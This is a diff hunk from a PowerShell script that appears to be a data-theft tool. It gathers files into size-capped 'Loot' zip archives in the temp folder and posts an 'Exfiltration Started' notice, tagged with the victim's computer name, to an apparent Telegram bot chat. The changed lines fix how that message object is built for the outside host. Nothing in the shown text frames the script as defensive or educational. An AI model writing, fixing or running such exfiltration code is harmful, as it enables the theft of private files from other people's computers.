@@ -44,8 +44,9 @@ $maxZipFileSize = 50MB
 $currentZipSize = 0
 $index = 1
 $zipFilePath ="$env:temp/Loot$index.zip"
-
-$MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$env:COMPUTERNAME : Exfiltrat." -Force
+$MessageToSend = New-Object psobject 
+$MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
+$MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$env:COMPUTERNAME : Exfiltration Started." -Force
 irm -Method Post -Uri ($URL +'/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json"
 
 If($Path -ne $null){
